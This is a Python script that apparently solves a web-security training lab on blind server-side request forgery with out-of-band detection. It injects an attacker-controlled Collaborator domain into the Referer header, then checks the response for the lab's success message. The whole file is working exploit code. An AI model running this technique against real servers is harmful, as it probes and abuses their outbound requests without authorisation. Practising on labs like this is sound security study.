#!/bin/env python3
import requests
import sys
import random
import urllib3
from urllib.parse import urlparse
from colorama import init, Fore, Back, Style
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def ssrf_dnslog(url, dnslog):
	product_path = '/product?productId={0}'.format(random.randint(1,20))
	header = {
		'Cookie': 'session=vXqYNAwqaChejiOBLxMIbPUdlnE8BIRc',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Referer': 'https://{0}/'.format(dnslog),
		'Sec-Fetch-Dest': 'document',
		'Sec-Fetch-Mode': 'navigate',
		'Sec-Fetch-Site': 'same-origin',
		'Sec-Fetch-User': '?1',
		'Te': 'trailers'
	}
	req = requests.get(url + product_path, headers=header, verify=False, proxies=proxies)
	print("\033[1;33;40m[+] Verifying if ssrf exploit worked...")
	
	if(req.status_code == 504):
		print("\033[36m[-] Response: [Server Error: Gateway Timeout]")
		print("\033[1;31;40m[-] The lab url is invalid, please get it again.")
		sys.exit(-1)
	elif (req.status_code == 200 and 'Congratulations, you solved the lab!' in req.text):
		print("\033[1;32;40m[+] Blind SSRF with out-of-band detection successful!")
		print("\033[1;32;40m[+] Go back to the Burp Collaborator client window poll now get result.")
	else:
		print("\033[1;31;40m[-] Blind SSRF with out-of-band detection not successful.")

def main():
	if len(sys.argv) != 3:
		print("\033[36m[+] Usage: {0} <url> <burp collaborator domain>".format(sys.argv[0]))
		print("\033[36m[+] Example: {0} https://www.bing.com abcdf.oastify.com".format(sys.argv[0]))
		sys.exit(-1)

	o = urlparse(sys.argv[1])
	url = o.scheme + "://" + o.hostname
	dnslog = sys.argv[2]

	print("\033[36m[+] Checking blind SSRF with out-of-band detection...")

	ssrf_dnslog(url, dnslog)


if __name__ == "__main__":
	main()